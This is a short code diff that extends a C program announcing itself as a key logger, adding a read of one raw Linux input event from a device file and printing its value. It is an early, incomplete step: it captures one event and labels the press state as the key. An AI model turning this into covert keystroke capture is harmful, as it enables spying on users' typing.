@@ -1,6 +1,9 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <stdlib.h>
+#include <linux/input.h>
+#include <unistd.h>
+
 int main(int argc, char *argv[])
 {
     if (argc != 2)
@@ -9,5 +12,10 @@ int main(int argc, char *argv[])
             exit(-1);
     }
     printf("Key logger activating .....\n");
-    open(argv[1], 0_RDONLY, 0);
+    int fd = open(argv[1], O_RDONLY, 0);
+
+    struct input_event ie;
+    read(fd, &ie, sizeof(ie));
+
+    printf("Key pressed: %d\n", ie.value);
 }
